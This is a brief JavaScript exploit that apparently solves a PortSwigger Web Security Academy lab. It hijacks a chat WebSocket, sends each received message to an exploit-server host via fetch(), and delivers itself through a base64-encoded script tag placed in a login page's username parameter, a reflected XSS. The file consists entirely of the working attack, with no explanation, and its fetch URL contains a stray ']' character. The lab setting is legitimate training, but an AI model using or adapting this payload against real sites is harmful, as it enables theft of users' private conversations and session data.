var ws = new WebSocket(
    "wss://0a26009c04eeca73800bf338005400dc.web-security-academy.net/chat"
);
ws.onopen = function () {
    ws.send("READY");
};

ws.onmessage = function (event) {
    fetch(
        "]https://exploit-0ade00310419ca0d808df2d301bb0041.exploit-server.net/exploit?content=" +
            event.data
    );
};

document.location =
    "https://cms-0a26009c04eeca73800bf338005400dc.web-security-academy.net/login?username=PHNjcmlwdD4KdmFyIHdzID0gbmV3IFdlYlNvY2tldCgKICAgICJ3c3M6Ly8wYTI2MDA5YzA0ZWVjYTczODAwYmYzMzgwMDU0MDBkYy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvY2hhdCIKKTsKd3Mub25vcGVuID0gZnVuY3Rpb24gKCkgewogICAgd3Muc2VuZCgiUkVBRFkiKTsKfTsKCndzLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldmVudCkgewogICAgZmV0Y2goCiAgICAgICAgIl1odHRwczovL2V4cGxvaXQtMGFkZTAwMzEwNDE5Y2EwZDgwOGRmMmQzMDFiYjAwNDEuZXhwbG9pdC1zZXJ2ZXIubmV0L2V4cGxvaXQ/Y29udGVudD0iICsKICAgICAgICAgICAgZXZlbnQuZGF0YQogICAgKTsKfTsKPC9zY3JpcHQ+&password=foobar";
